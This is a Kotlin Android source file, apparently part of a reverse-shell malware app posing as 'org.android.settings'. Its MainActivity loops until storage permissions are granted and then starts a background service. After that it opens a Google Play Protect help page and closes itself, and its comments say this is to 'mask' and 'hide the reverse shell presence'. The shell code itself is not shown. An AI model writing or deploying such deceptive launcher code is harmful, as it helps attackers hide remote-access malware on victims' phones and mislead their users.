package org.android.settings

import android.Manifest
import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Bundle
import android.os.SystemClock
import android.support.v4.app.ActivityCompat
import android.support.v7.app.AppCompatActivity

class MainActivity : AppCompatActivity() {

    companion object {
        /* Use function "_getPublicContext()" to access Context from
        * thread started by MainServices (which does not have direct
        * access to a Context). This function can return Null if
        * variable "publicContext" is not initialized: this is used
        * to prevent fatal Errors of "lateinit property has not been
        * initialized" */
        @SuppressLint("StaticFieldLeak")
        lateinit var publicContext: Context
        /* Called "getPublicContext2" with trailing "2" to prevent the
        * following error: "The following declarations have the same
        * JVM signature (getPublicContext()Landroid/content/Context;):
        * fun getPublicContext(): Context? defined in
        * org.android.settings.MainActivity.Companion" */
        fun getPublicContext2(): Context? {
            if (::publicContext.isInitialized) {
                return publicContext
            } else {
                return null
            }
        }
    }

    object Env {
        const val PERMISSION_CODE_READ_EXTERNAL_STORAGE  = 0
        const val PERMISSION_CODE_WRITE_EXTERNAL_STORAGE = 1
    }

    private fun setPermission(permission: String, permissionCode: Int) {
        if (!getPermissions(permission)) {
            ActivityCompat.requestPermissions(this, arrayOf(permission), permissionCode)
        }
    }

    private fun getPermissions(permission: String): Boolean {
        return ActivityCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        publicContext = this

        /* Check and ask permissions */
        while (!getPermissions(Manifest.permission.READ_EXTERNAL_STORAGE) && !getPermissions(Manifest.permission.WRITE_EXTERNAL_STORAGE)) {
            setPermission(Manifest.permission.READ_EXTERNAL_STORAGE, Env.PERMISSION_CODE_READ_EXTERNAL_STORAGE)
            setPermission(Manifest.permission.WRITE_EXTERNAL_STORAGE, Env.PERMISSION_CODE_WRITE_EXTERNAL_STORAGE)
            SystemClock.sleep(500)
        }

        /* Start main service */
        MainService.startService(this)

        /* Open Google Play Protect documentation
        * page to mask the reverse shell presence */
        startActivity(Intent(
            Intent.ACTION_VIEW,
            Uri.parse("https://support.google.com/googleplay/answer/2812853?hl=it")))

        /* Close this activity to hide the reverse shell presence */
        finish()
    }
}